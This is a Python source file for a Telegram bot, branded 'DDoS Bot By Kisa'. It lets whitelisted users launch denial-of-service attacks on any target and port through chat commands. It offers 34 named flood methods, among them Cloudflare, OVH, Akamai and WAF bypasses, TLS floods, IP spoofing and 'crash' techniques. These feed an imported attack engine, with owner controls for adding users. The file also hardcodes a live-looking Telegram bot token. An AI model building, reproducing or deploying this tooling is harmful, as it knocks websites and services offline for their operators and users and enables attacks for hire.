import telebot
from telebot import types, formatting
import threading
import time
from Fixed import DDoSTool
from requests.exceptions import ConnectionError

TOKEN = '7701982556:AAHXjZJn6vDE5U4qv9-g196qQXL2fyJJAFQ'
OWNER_ID = 7742396488
ADMIN_IDS = [OWNER_ID]
ALLOWED_USERS = [OWNER_ID]

bot = telebot.TeleBot(TOKEN)
tool = DDoSTool()
active_attacks = {}
user_management_lock = threading.Lock()

METHOD_INFO = {
    'raw': "<b>Basic HTTP flood</b> - High packets per second (PPS) attack using raw HTTP requests",
    'bypass': "<b>Bypass</b> - Special technique to bypass Cloudflare/OVH protection systems",
    'mix': "<b>Mixed flood</b> - Combined HTTP methods attack (GET/POST/HEAD) for maximum impact",
    'cloud': "<b>Cloudflare bypass</b> - Advanced method to penetrate Cloudflare-protected targets",
    'get': "<b>HTTP GET flood</b> - Powerful GET request bombardment attack",
    'uam': "<b>UAM bypass</b> - Bypasses Cloudflare Under Attack Mode protection",
    'waf': "<b>WAF bypass</b> - Special technique to circumvent Web Application Firewalls",
    'ovh': "<b>OVH bypass</b> - Specialized method for OVH hosting infrastructure",
    'onec': "<b>Single connection</b> - Low-profile attack using persistent single connection",
    'sky': "<b>Cookie flood</b> - Attack using valid session cookies and headers",
    'spoof': "<b>IP spoofing</b> - Attack with randomized source IP addresses",
    'post': "<b>HTTP POST flood</b> - Heavy POST request bombardment attack",
    'raw+': "<b>Enhanced raw</b> - Upgraded version of raw flood with better performance",
    'high': "<b>High-performance</b> - Maximum power attack for premium targets",
    'uam+': "<b>Improved UAM</b> - Enhanced Cloudflare Under Attack Mode bypass",
    'tls': "<b>TLS flood</b> - SSL/TLS handshake exhaustion attack",
    'http/2': "<b>HTTP/2 flood</b> - Next-gen HTTP/2 protocol attack",
    'gurd': "<b>DDoS-GUARD</b> - Special bypass for DDoS-GUARD protected sites",
    'kill': "<b>Kill switch</b> - Aggressive attack designed to crash services",
    'tlsv2': "<b>TLSv1.2 flood</b> - Specialized TLS version 1.2 attack",
    'null': "<b>Null packet</b> - Attack using malformed null packets",
    'kill+': "<b>Enhanced kill</b> - Upgraded version of kill switch method",
    'https': "<b>HTTPS flood</b> - SSL-encrypted attack for HTTPS targets",
    'ir': "<b>Iran bypass</b> - Special technique for Iranian firewall bypass",
    'war': "<b>Amazon WAF</b> - Bypass for Amazon Web Application Firewall",
    'war+': "<b>Enhanced WAF</b> - Improved Amazon WAF bypass technique",
    'zeus': "<b>Akamai bypass</b> - Special method for Akamai-protected targets",
    'by+': "<b>Ultimate bypass</b> - Combined bypass techniques for maximum penetration",
    'pro': "<b>Professional grade</b> - Enterprise-level attack with smart routing",
    'crash': "<b>Crash technique</b> - Designed to crash vulnerable services immediately",
    'https+': "<b>HTTPS++</b> - Enhanced SSL attack with better encryption handling",
    'waf+': "<b>WAF++</b> - Next-generation WAF bypass technology",
    'storm': "<b>Storm</b> - Rapid request storm technique",
    'storm+': "<b>Enhanced storm</b> - Upgraded storm technique with better patterns"
}

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_allowed(user_id):
    with user_management_lock:
        return user_id in ALLOWED_USERS

def add_user(user_id):
    with user_management_lock:
        if user_id not in ALLOWED_USERS:
            ALLOWED_USERS.append(user_id)
            return True
        return False

def remove_user(user_id):
    with user_management_lock:
        if user_id in ALLOWED_USERS and user_id != OWNER_ID:
            ALLOWED_USERS.remove(user_id)
            return True
        return False

def send_attack_alert(attack_details):
    alert_msg = (
        f"🚨‼️𝗔𝘁𝘁𝗮𝗰𝗸 𝗔𝗹𝗲𝗿𝘁‼️🚨\n\n"
        f"• 𝗧𝗮𝗿𝗴𝗲𝘁: <code>{attack_details['target']}:{attack_details['port']}</code>\n"
        f"• 𝗠𝗲𝘁𝗵𝗼𝗱: <code>{attack_details['method']}</code>\n"
        f"• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: <code>{attack_details['threads']}</code>\n"
        f"• 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: <code>{attack_details['duration']}s</code>\n"
        f"• 𝗨𝘀𝗲𝗿 𝗜𝗱: <code>{attack_details['user_id']}</code>"
    )
    for admin_id in [OWNER_ID] + ADMIN_IDS:
        try:
            bot.send_message(admin_id, alert_msg, parse_mode='HTML')
        except:
            pass

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_allowed(message.from_user.id):
        return

    help_text = ("𝗗𝗗𝗼𝗦 𝗕𝗼𝘁 𝗕𝘆 𝗞𝗶𝘀𝗮✅") + "\n\n" + (
        "𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "/method [𝘁𝗮𝗿𝗴𝗲𝘁] [𝗽𝗼𝗿𝘁] [𝘁𝗵𝗿𝗲𝗮𝗱𝘀] [𝗿𝗽𝗰] [𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻] - 𝗦𝘁𝗮𝗿𝘁 𝗮𝘁𝘁𝗮𝗰𝗸\n"
        "/methods - 𝗦𝗵𝗼𝘄 𝗮𝗹𝗹 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗺𝗲𝘁𝗵𝗼𝗱𝘀\n"
        "/status - 𝗦𝗵𝗼𝘄 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝘁𝘁𝗮𝗰𝗸\n"
        "/stop_all - 𝗦𝘁𝗼𝗽 𝗮𝗹𝗹 𝗮𝘁𝘁𝗮𝗰𝗸\n\n"
        "𝗢𝘄𝗻𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:\n"
        "/admin - 𝗨𝘀𝗲𝗿 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁"
    )
    bot.reply_to(message, help_text, parse_mode=None)

@bot.message_handler(commands=['methods'])
def show_methods(message):
    if not is_allowed(message.from_user.id):
        return

    methods_text = formatting.hbold("𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗠𝗲𝘁𝗵𝗼𝗱𝘀:") + "\n\n"
    for method, desc in METHOD_INFO.items():
        methods_text += f"• /{method} - {desc}\n"
    
    bot.reply_to(message, methods_text, parse_mode='HTML')

def create_attack_handler(method):
    def handler(message):
        if not is_allowed(message.from_user.id):
            return

        try:
            parts = message.text.split()
            if len(parts) != 6:
                raise ValueError("𝗜𝗻𝘃𝗮𝗶𝗹𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗮𝗴𝗲: /𝗺𝗲𝘁𝗵𝗼𝗱 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗵𝗲𝗿𝗮𝗱𝘀 𝗿𝗽𝗰 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻")

            _, target, port, threads, rpc, duration = parts
            port = int(port)
            threads = int(threads)
            rpc = int(rpc)
            duration = int(duration)

            attack_id = f"{message.chat.id}_{message.message_id}"
            attack_details = {
                'method': method,
                'target': target,
                'port': port,
                'threads': threads,
                'rpc': rpc,
                'duration': duration,
                'user_id': message.from_user.id
            }

            active_attacks[attack_id] = attack_details
            send_attack_alert(attack_details)

            threading.Thread(
                target=run_attack,
                args=(attack_id, 'layer7', method, target, port, threads, rpc, duration, message.chat.id)
            ).start()

            bot.reply_to(
                message,
                f"‼️𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱‼️\n\n"
                f"• 𝗠𝗲𝘁𝗵𝗼𝗱: <code>{method}</code>\n"
                f"• 𝗧𝗮𝗿𝗴𝗲𝘁: <code>{target}:{port}</code>\n"
                f"• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: <code>{threads}</code>\n"
                f"• 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: <code>{duration}s</code>",
                parse_mode='HTML'
            )

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='HTML')

    return handler

for method in METHOD_INFO.keys():
    bot.message_handler(commands=[method])(create_attack_handler(method))

def run_attack(attack_id, layer, method, target, port, threads, rpc, duration, chat_id):
    try:
        tool.start_attack(layer, method, target, port, threads, rpc, duration)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗱 𝗙𝗮𝗶𝗹𝗲𝗱: {str(e)}")
    finally:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
            bot.send_message(chat_id, "✅𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_owner(message.from_user.id):
        return

    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("👥 𝗟𝗶𝘀𝘁 𝗨𝘀𝗲𝗿", callback_data="admin_list_users"),
        types.InlineKeyboardButton("➕ 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿", callback_data="admin_add_user"),
        types.InlineKeyboardButton("➖ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿", callback_data="admin_remove_user")
    )
    bot.send_message(message.chat.id, "𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_actions(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ You are not authorized!", show_alert=True)
        return

    action = call.data.split('_')[1]
    if action == "list_users":
        with user_management_lock:
            users_list = "\n".join([f"• <code>{uid}</code>" for uid in ALLOWED_USERS])
        bot.edit_message_text(
            f"👥𝗔𝗹𝗹𝗼𝘄𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n{users_list}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
    elif action == "add_user":
        msg = bot.send_message(call.message.chat.id, "Send the user ID to add:")
        bot.register_next_step_handler(msg, process_add_user)
    elif action == "remove_user":
        msg = bot.send_message(call.message.chat.id, "Send the user ID to remove:")
        bot.register_next_step_handler(msg, process_remove_user)

def process_add_user(message):
    try:
        user_id = int(message.text)
        if add_user(user_id):
            reply = f"✅ User <code>{user_id}</code> added successfully!"
        else:
            reply = f"ℹ️ User <code>{user_id}</code> already exists"
        bot.send_message(message.chat.id, reply, parse_mode='HTML')
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID! Must be a number", parse_mode='HTML')

def process_remove_user(message):
    try:
        user_id = int(message.text)
        if remove_user(user_id):
            reply = f"✅ User <code>{user_id}</code> removed successfully!"
        else:
            reply = f"❌ User <code>{user_id}</code> not found or is owner"
        bot.send_message(message.chat.id, reply, parse_mode='HTML')
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID! Must be a number", parse_mode='HTML')

@bot.message_handler(commands=['status'])
def show_status(message):
    if not is_allowed(message.from_user.id):
        return

    if not active_attacks:
        bot.reply_to(message, "ℹ️ No active attacks")
        return

    status_text = "𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸:\n\n"
    for attack_id, details in active_attacks.items():
        status_text += (
            f"• 𝗠𝗲𝘁𝗵𝗼𝗱: <code>{details['method']}</code>\n"
            f"• 𝗧𝗮𝗿𝗴𝗲𝘁: <code>{details['target']}:{details['port']}</code>\n"
            f"• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: <code>{details['threads']}</code>\n"
            f"• 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: <code>{details['duration']}s</code>\n"
            f"• 𝗜𝗗: <code>{attack_id}</code>\n\n"
        )
    
    bot.reply_to(message, status_text, parse_mode='HTML')

@bot.message_handler(commands=['stop_all'])
def stop_all_attacks(message):
    if not is_allowed(message.from_user.id):
        return

    count = len(active_attacks)
    active_attacks.clear()
    tool.stop_attack()
    bot.reply_to(message, f"🛑𝗦𝘁𝗼𝗽 𝗔𝗹𝗹 𝗔𝘁𝘁𝗮𝗰𝗸")

def start_bot():
    print("⚡ Starting DDoS Bot...")
    while True:
        try:
            bot.infinity_polling()
        except ConnectionError:
            print("⚠️ Connection lost. Reconnecting in 10 seconds...")
            time.sleep(10)
        except Exception as e:
            print(f"⛔ Critical error: {str(e)}")
            break

if __name__ == '__main__':
    start_bot()